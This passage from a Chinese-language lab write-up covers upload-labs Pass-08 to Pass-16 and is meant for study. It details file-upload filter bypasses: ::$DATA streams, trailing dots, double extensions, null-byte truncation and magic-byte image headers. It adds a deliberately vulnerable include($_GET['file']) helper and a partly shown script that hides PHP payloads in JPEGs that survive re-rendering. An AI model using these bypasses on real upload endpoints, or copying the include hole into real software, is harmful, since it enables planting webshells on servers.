class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">黑名单</span><br><span class=\"line\">上传后没有改名\t\t√</span><br><span class=\"line\">可上传jreg、png、gif、jpg\t\t√</span><br><span class=\"line\">可上传::<span class=\"variable\">$DATA</span>\t\t√</span><br><span class=\"line\">可上传php1,pHp1,php<span class=\"selector-class\">.xxx</span>,php. .\t\t√</span><br><span class=\"line\">空格绕过  ×</span><br><span class=\"line\"><span class=\"selector-class\">.htaccess</span> ×</span><br><span class=\"line\">.绕过 ×</span><br></pre></td></tr></table></figure>\n\n<p>::DATA仅支持Windows,在info.php中写入<?php phpinfo();?> 上传info.php::$DATA会在上传目录上生成一个info.php的文件</p>\n<p><img src=\"/img/fileupload/upload-labs/008_1.png\" alt=\"008_1\"></p>\n<p>底下插入了phpinfo函数。</p>\n<p><img src=\"/img/fileupload/upload-labs/008_2.png\" alt=\"008_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/008_3.png\" alt=\"008_3\"></p>\n<h3 id=\"相关特性\"><a href=\"#相关特性\" class=\"headerlink\" title=\"相关特性\"></a>相关特性</h3><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">假设上传个<span class=\"keyword\">info</span>.php文件,服务器为windows,<span class=\"keyword\">info</span>.php内容为&lt;?php phpinfo();?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">info</span>.php:a.jpg 生成<span class=\"keyword\">info</span>.php,内容为空</span><br><span class=\"line\"><span class=\"keyword\">info</span>.php::$DATA 生成<span class=\"keyword\">info</span>.php,内容为&lt;?php phpinfo();?&gt;</span><br><span class=\"line\"><span class=\"keyword\">info</span>.php::$INDEX_ALLOCATION  生成<span class=\"keyword\">info</span>.php文件夹</span><br><span class=\"line\"><span class=\"keyword\">info</span>.php::$DATA\\<span class=\"number\">0.</span>jpg    生成<span class=\"number\">0.</span>jpg,内容为&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>把Pass-07的检查::$DATA的注释掉测试一下</p>\n<p><img src=\"/img/fileupload/upload-labs/008_4.png\" alt=\"008_4\"></p>\n<p>以上的测试在本地通过。</p>\n<h2 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h2><h3 id=\"php-绕过\"><a href=\"#php-绕过\" class=\"headerlink\" title=\"php. .绕过\"></a>php. .绕过</h3><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传后没有改名\t\t√</span><br><span class=\"line\">可上传jreg、png、gif、jpg\t\t√</span><br><span class=\"line\">可上传::<span class=\"variable\">$DATA</span>\t\t×</span><br><span class=\"line\">可上传php1,pHp1,php<span class=\"selector-class\">.xxx</span>,php. .\t\t√</span><br><span class=\"line\">.绕过 ×</span><br><span class=\"line\"><span class=\"selector-class\">.htaccess</span> ×</span><br></pre></td></tr></table></figure>\n\n<p>根据没有改名和可以上传<code>php. .</code>猜测可能存在绕过。</p>\n<p><img src=\"/img/fileupload/upload-labs/009_1.png\" alt=\"009_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/009_2.png\" alt=\"009_2\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/009_3.png\" alt=\"009_3\"></p>\n<p>产生问题的原因是只删除了一次点号,当上传<code>info.php. .</code>时,先删除第一个点得到<code>info.php.</code>最后变成了点绕过。</p>\n<h2 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h2><h3 id=\"双写后缀名绕过\"><a href=\"#双写后缀名绕过\" class=\"headerlink\" title=\"双写后缀名绕过\"></a>双写后缀名绕过</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">发现php替换成了空</span><br><span class=\"line\">上传<span class=\"keyword\">default</span>.pphphp即可成功,应该是源代码中只替换了一次</span><br><span class=\"line\"></span><br><span class=\"line\">上传后没有改名\t\t√</span><br><span class=\"line\">可上传jreg、png、gif、jpg\t\t√</span><br><span class=\"line\">可上传::$DATA\t\t√</span><br><span class=\"line\">替换php为空</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/010_1.png\" alt=\"010_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/010_2.png\" alt=\"010_2\"></p>\n<p> 查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/010_3.png\" alt=\"010_3\"></p>\n<h2 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h2><h3 id=\"00截断绕过白名单\"><a href=\"#00截断绕过白名单\" class=\"headerlink\" title=\"%00截断绕过白名单\"></a>%00截断绕过白名单</h3><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">白名单</span><br><span class=\"line\">双写后缀\t\t×</span><br><span class=\"line\">特殊后缀名\t\t×</span><br><span class=\"line\">::<span class=\"variable\">$DATA</span>\t\t\t×</span><br><span class=\"line\">文件上传被改名     √</span><br><span class=\"line\">可上传png、gif、jpg\t\t√</span><br></pre></td></tr></table></figure>\n\n<p><strong>PHP版本低于5.3.29，且GPC关闭</strong>下是可以突破的</p>\n<p><img src=\"/img/fileupload/upload-labs/011_1.png\" alt=\"011_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/011_2.png\" alt=\"011_2\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/011_3.png\" alt=\"011_3\"></p>\n<p>问题的根源是上传的路径是用户可控的,当上传的路径为<code>save_path=../upload/yyg.php%00</code>后还会进行拼接,在接下来移动文件的时候经过<code>%00</code>截断后保留文件为<code>yyg.php</code>.</p>\n<p><img src=\"/img/fileupload/upload-labs/011_4.png\" alt=\"011_4\"></p>\n<p>用户能够控制上传路径是十分危险的。</p>\n<h2 id=\"0x12\"><a href=\"#0x12\" class=\"headerlink\" title=\"0x12\"></a>0x12</h2><h3 id=\"0x00截断绕过白名单\"><a href=\"#0x00截断绕过白名单\" class=\"headerlink\" title=\"0x00截断绕过白名单\"></a>0x00截断绕过白名单</h3><p>应该还是白名单,测试下先</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">双写后缀\t\t×</span><br><span class=\"line\">可上传png、gif、<span class=\"keyword\">jpg\t</span>\t√</span><br><span class=\"line\">文件上传被改名，后缀保留\t\t√ </span><br><span class=\"line\">特殊后缀名\t\t×</span><br></pre></td></tr></table></figure>\n\n<p><strong>PHP版本低于5.3.29，且GPC关闭</strong>下是可以突破的</p>\n<p>用burp抓包发现可以控制<code>save_path</code>,和get方式不同,POST方式利用0x00截断</p>\n<p><img src=\"/img/fileupload/upload-labs/012_1.png\" alt=\"012_1\"></p>\n<p>选中%00，用快捷键<code>ctrl+shift+u</code>后Go</p>\n<p><img src=\"/img/fileupload/upload-labs/012_2.png\" alt=\"012_2\"></p>\n<p>成了</p>\n<p><img src=\"/img/fileupload/upload-labs/012_3.png\" alt=\"012_3\"></p>\n<p>也可以用这种方式</p>\n<p><img src=\"/img/fileupload/upload-labs/012_4.png\" alt=\"012_4\"></p>\n<p><img src=\"/img/fileupload/upload-labs/012_5.png\" alt=\"012_5\"></p>\n<p><img src=\"/img/fileupload/upload-labs/012_6.png\" alt=\"012_6\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/012_7.png\" alt=\"012_7\"></p>\n<p>可以看到与Pass-11只是用了POST方式</p>\n<p>截断利用条件</p>\n<ol>\n<li>php版本小于<code>5.3.29</code> `。</li>\n<li>php的<code>magic_quotes_gpc</code>为OFF状态。</li>\n<li>拼接点在<code>url</code>处即<code>get</code>使用<code>%00</code></li>\n<li>拼接点在<code>post</code>处使用<code>0x00</code></li>\n</ol>\n<h2 id=\"0x13\"><a href=\"#0x13\" class=\"headerlink\" title=\"0x13\"></a>0x13</h2><h3 id=\"绕过二进制文件前两位ASCII检测\"><a href=\"#绕过二进制文件前两位ASCII检测\" class=\"headerlink\" title=\"绕过二进制文件前两位ASCII检测\"></a>绕过二进制文件前两位ASCII检测</h3><p><img src=\"/img/fileupload/upload-labs/013_1.png\" alt=\"013_1\"></p>\n<p>这一课需求变了,要求上传图片马,简单测试发现是白名单,会拼接图片后缀。上传图片马后还需要文件包含漏洞才行,但是作者提供的环境有没有文件包含。自己写一份本地验证。</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#includes.php 放在upload-labs根路径</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'file'</span>]) &#123;</span><br><span class=\"line\">\t\t$file = $_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">include</span> $file;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">include</span> <span class=\"string\">'index.php'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>burp抓包修改上传的gif文件,末尾插入phpinfo。png和jpg都能用这种方法。</p>\n<p><img src=\"/img/fileupload/upload-labs/013_2.png\" alt=\"013_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/013_3.png\" alt=\"013_3\"></p>\n<p>查看源码后发现考点在文件头幻数检测。</p>\n<p><img src=\"/img/fileupload/upload-labs/013_4.png\" alt=\"013_4\"></p>\n<p>JPG</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">16</span>进制</span><br><span class=\"line\">FF D8 FF E0 <span class=\"number\">00</span> <span class=\"number\">10</span> <span class=\"number\">4</span>A <span class=\"number\">46</span> <span class=\"number\">49</span> <span class=\"number\">46</span></span><br></pre></td></tr></table></figure>\n\n<p>GIF</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"number\">47</span> <span class=\"number\">49</span> <span class=\"number\">46</span> <span class=\"number\">38</span> <span class=\"number\">39</span> <span class=\"number\">61</span></span><br></pre></td></tr></table></figure>\n\n<p>(相当于文本的GIF89a,一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p>\n<p>PNG</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"number\">89</span> <span class=\"number\">50</span> <span class=\"number\">4</span>E <span class=\"number\">47</span></span><br></pre></td></tr></table></figure>\n\n<p>上传一个没有内容的空文件。</p>\n<p><img src=\"/img/fileupload/upload-labs/013_5.png\" alt=\"013_5\"></p>\n<p>GIF用自己添加的文件包含php验证</p>\n<p><img src=\"/img/fileupload/upload-labs/013_6.png\" alt=\"013_6\"></p>\n<p>PNG:</p>\n<p>可以用<code>ctrl+shift+u</code>快捷键将<code>%89</code>直接转hex</p>\n<p><img src=\"/img/fileupload/upload-labs/013_7.png\" alt=\"013_7\"></p>\n<p>JPG:</p>\n<p>可以用<code>ctrl+shift+u</code>快捷键将<code>%FF%D8%FF%E0%00%10%4A%46%49%46</code></p>\n<p><img src=\"/img/fileupload/upload-labs/013_8.png\" alt=\"013_8\"></p>\n<h2 id=\"0x14\"><a href=\"#0x14\" class=\"headerlink\" title=\"0x14\"></a>0x14</h2><h3 id=\"突破getimagesize\"><a href=\"#突破getimagesize\" class=\"headerlink\" title=\"突破getimagesize()\"></a>突破getimagesize()</h3><p>尝试了下用Pass-13的方法依然能上传图片马.png和jpg一样.</p>\n<p><img src=\"/img/fileupload/upload-labs/014_1.png\" alt=\"014_1\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/014_2.png\" alt=\"014_2\"></p>\n<p>这里是利用getimages函数来获取图片的宽高信息的,如果上传的不是图片,那就获取不到信息.</p>\n<p>依旧可以利用补充对应的图片文件头绕过.</p>\n<p>png:</p>\n<p>png有些特殊,光给文件头还不行,需指定文件大小。把下面这段</p>\n<p><code>%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52</code></p>\n<p>带入</p>\n<p><img src=\"/img/fileupload/upload-labs/014_3.png\" alt=\"014_3\"></p>\n<p>选中后用<code>ctrl+shift+u</code>快捷键。</p>\n<p><img src=\"/img/fileupload/upload-labs/014_4.png\" alt=\"014_4\"></p>\n<p><img src=\"/img/fileupload/upload-labs/014_5.png\" alt=\"014_5\"></p>\n<p>jpg:</p>\n<p>测试失败,即使是上传正常的jpg也被拒绝。</p>\n<h2 id=\"0x15\"><a href=\"#0x15\" class=\"headerlink\" title=\"0x15\"></a>0x15</h2><h3 id=\"突破exif-imagetype\"><a href=\"#突破exif-imagetype\" class=\"headerlink\" title=\"突破exif_imagetype()\"></a>突破exif_imagetype()</h3><p>gif:</p>\n<p><img src=\"/img/fileupload/upload-labs/015_1.png\" alt=\"015_1\"></p>\n<p>png:<code>%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52</code></p>\n<p><img src=\"/img/fileupload/upload-labs/015_2.png\" alt=\"015_2\"></p>\n<p>jpg:<code>%FF%D8%FF%E0%00%10%4A%46%49%46</code></p>\n<p><img src=\"/img/fileupload/upload-labs/015_3.png\" alt=\"015_3\"></p>\n<p>源码:</p>\n<p><img src=\"/img/fileupload/upload-labs/015_4.png\" alt=\"015_4\"></p>\n<h2 id=\"0x16\"><a href=\"#0x16\" class=\"headerlink\" title=\"0x16\"></a>0x16</h2><h3 id=\"二次渲染\"><a href=\"#二次渲染\" class=\"headerlink\" title=\"二次渲染\"></a>二次渲染</h3><p>二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了</p>\n<p>之前的招数不管用了,这次文件上传的图片经过了二次渲染。其中的代表<code>imagecreatefromjpeg</code>函数。</p>\n<p>通过查询MD5值可以看到.</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows下<span class=\"keyword\">cmd</span><span class=\"bash\">查看MD5:certutil -hashfile <span class=\"string\">\"filename\"</span> MD5</span></span><br><span class=\"line\">linux:md5sum <span class=\"string\">\"filename\"</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/016_1.png\" alt=\"016_1\"></p>\n<p>尝试了把phpinfo插入到文件的末尾,但是渲染的时候明显取不到这个位置。</p>\n<h3 id=\"jpg\"><a href=\"#jpg\" class=\"headerlink\" title=\"jpg:\"></a>jpg:</h3><p>可以通过毛子写的脚本生成一个二次渲染后依旧能保留payload的图片上传。</p>\n<p>利用方式,先上传jpg图片后,再把经过渲染的图片下到本地,通过</p>\n<p><code>php jpg_payload.php 1.jpg</code>命令生成payload图片。</p>\n<p><img src=\"/img/fileupload/upload-labs/016_2.png\" alt=\"016_2\"></p>\n<h4 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tThe algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class=\"line\"><span class=\"comment\">\tIt is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t1) Upload an arbitrary image via secured files upload script</span></span><br><span class=\"line\"><span class=\"comment\">\t2) Save the processed image and launch:</span></span><br><span class=\"line\"><span class=\"comment\">\tjpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tIn case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tSince the most straightforward injection method is used, the following problems can occur:</span></span><br><span class=\"line\"><span class=\"comment\">\t1) After the second processing the injected data may become partially corrupted.</span></span><br><span class=\"line\"><span class=\"comment\">\t2) The jpg_payload.php script outputs \"Something's wrong\".</span></span><br><span class=\"line\"><span class=\"comment\">\tIf this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tSergey Bobrov <span class=\"doctag\">@Black</span>2Fan.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tSee also:</span></span><br><span class=\"line\"><span class=\"comment\">\thttps://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t$miniPayload = <span class=\"string\">\"&lt;?php phpinfo();?&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!extension_loaded(<span class=\"string\">'gd'</span>) || !function_exists(<span class=\"string\">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">die</span>(<span class=\"string\">'php-gd is not installed'</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($argv[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tset_error_handler(<span class=\"string\">\"custom_error_handler\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>($pad = <span class=\"number\">0</span>; $pad &lt; <span class=\"number\">1024</span>; $pad++) &#123;</span><br><span class=\"line\">\t\t$nullbytePayloadSize = $pad;</span><br><span class=\"line\">\t\t$dis = <span class=\"keyword\">new</span> DataInputStream($argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t$outStream = file_get_contents($argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t$extraBytes = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t$correctImage = <span class=\"keyword\">TRUE</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($dis-&gt;readShort() != <span class=\"number\">0xFFD8</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Incorrect SOI marker'</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class=\"number\">0xFF</span>)) &#123;</span><br><span class=\"line\">\t\t\t$marker = $dis-&gt;readByte();</span><br><span class=\"line\">\t\t\t$size = $dis-&gt;readShort() - <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t\t$dis-&gt;skip($size);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>($marker === <span class=\"number\">0xDA</span>) &#123;</span><br><span class=\"line\">\t\t\t\t$startPos = $dis-&gt;seek();</span><br><span class=\"line\">\t\t\t\t$outStreamTmp = </span><br><span class=\"line\">\t\t\t\t\tsubstr($outStream, <span class=\"number\">0</span>, $startPos) . </span><br><span class=\"line\">\t\t\t\t\t$miniPayload . </span><br><span class=\"line\">\t\t\t\t\tstr_repeat(<span class=\"string\">\"\\0\"</span>,$nullbytePayloadSize) . </span><br><span class=\"line\">\t\t\t\t\tsubstr($outStream, $startPos);</span><br><span class=\"line\">\t\t\t\tcheckImage(<span class=\"string\">'_'</span>.$argv[<span class=\"number\">1</span>], $outStreamTmp, <span class=\"keyword\">TRUE</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($extraBytes !== <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span>($dis-&gt;readByte() === <span class=\"number\">0xFF</span>) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"keyword\">if</span>($dis-&gt;readByte !== <span class=\"number\">0x00</span>) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t$stopPos = $dis-&gt;seek() - <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t\t\t\t$imageStreamSize = $stopPos - $startPos;</span><br><span class=\"line\">\t\t\t\t\t$outStream = </span><br><span class=\"line\">\t\t\t\t\t\tsubstr($outStream, <span class=\"number\">0</span>, $startPos) . </span><br><span class=\"line\">\t\t\t\t\t\t$miniPayload . </span><br><span class=\"line\">\t\t\t\t\t\tsubstr(</span><br><span class=\"line\">\t\t\t\t\t\t\tstr_repeat(<span class=\"string\">\"\\0\"</span>,$nullbytePayloadSize).</span><br><span class=\"line\">\t\t\t\t\t\t\t\tsubstr($outStream, $startPos, $imageStreamSize),</span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t\t\t\t\t\t$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class=\"line\">\t\t\t\t\t\t\t\tsubstr($outStream, $stopPos);</span><br><span class=\"line\">\t\t\t\t&#125; <span class=\"keyword\">elseif</span>($correctImage) &#123;</span><br><span class=\"line\">\t\t\t\t\t$outStream = $outStreamTmp;</span><br><span class=\"line\">\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(checkImage(<span class=\"string\">'payload_'</span>.$argv[<span class=\"number\">1</span>], $outStream)) &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Success!'</span>);</span><br><span class=\"line\">\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tunlink(<span class=\"string\">'payload_'</span>.$argv[<span class=\"number\">1</span>]);</span><br><span 